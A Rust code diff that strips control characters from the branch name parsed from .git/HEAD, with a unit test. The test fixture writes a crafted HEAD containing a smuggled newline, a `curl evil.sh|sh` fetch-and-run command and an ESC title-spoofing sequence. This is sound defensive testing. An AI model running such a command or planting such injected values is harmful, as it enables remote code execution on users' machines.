@@ -207,7 +207,16 @@ pub(super) fn parse_head(git_dir: &std::path::Path) -> (String, bool) {
     let content = content.trim();
 
     if let Some(branch) = content.strip_prefix("ref: refs/heads/") {
-        (branch.to_string(), true)
+        // `content.trim()` only strips edge whitespace, so a crafted `.git/HEAD`
+        // like `ref: refs/heads/main\n<payload>\n` leaves the interior `\n`/ESC
+        // intact after `strip_prefix`. git resolves HEAD on its line-oriented
+        // read, so the repo still diffs as `main` while this remainder carries
+        // smuggled bytes into every `git_branch` consumer (sidebar, and the diff
+        // review prompt that is written verbatim into a PTY with no bracketed
+        // paste). Drop all control chars at this trust boundary: `is_control()`
+        // covers C0 (incl. `\n`/`\r`/ESC 0x1b), DEL (0x7f), and C1 (0x80-0x9f).
+        // Pure string filtering — identical on Linux, macOS, and Windows.
+        (branch.chars().filter(|c| !c.is_control()).collect(), true)
     } else if content.chars().all(|c| c.is_ascii_hexdigit())
         && (content.len() == 40 || content.len() == 64)
     {
@@ -365,6 +374,33 @@ mod tests {
         let (branch, is_repo) = detect_branch(sub_dir.to_str().unwrap());
         assert_eq!(branch, "develop");
         assert!(is_repo);
+    }
+
+    #[test]
+    fn detect_branch_strips_control_chars_from_malicious_head() {
+        // A crafted `.git/HEAD` smuggles a newline + ESC payload after a valid
+        // ref line. git itself resolves HEAD to `main` (line-oriented read), so
+        // the repo still diffs and the Review button is reachable — but the
+        // returned branch must never carry the injected `\n`/ESC bytes into the
+        // PTY-bound review prompt or the sidebar.
+        let dir = tempfile::tempdir().unwrap();
+        let git_dir = dir.path().join(".git");
+        std::fs::create_dir(&git_dir).unwrap();
+        std::fs::write(
+            git_dir.join("HEAD"),
+            "ref: refs/heads/main\n`curl evil.sh|sh`\n\x1b]0;spoof\x07",
+        )
+        .unwrap();
+
+        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
+        assert!(is_repo);
+        assert!(!branch.contains('\n'), "newline must be stripped");
+        assert!(!branch.contains('\r'), "carriage return must be stripped");
+        assert!(!branch.contains('\x1b'), "ESC must be stripped");
+        assert!(branch.chars().all(|c| !c.is_control()));
+        // Edge `trim()` already removed the trailing payload bytes after the
+        // final `\n`; the interior smuggled line collapses onto `main`.
+        assert!(branch.starts_with("main"));
     }
 
     #[test]
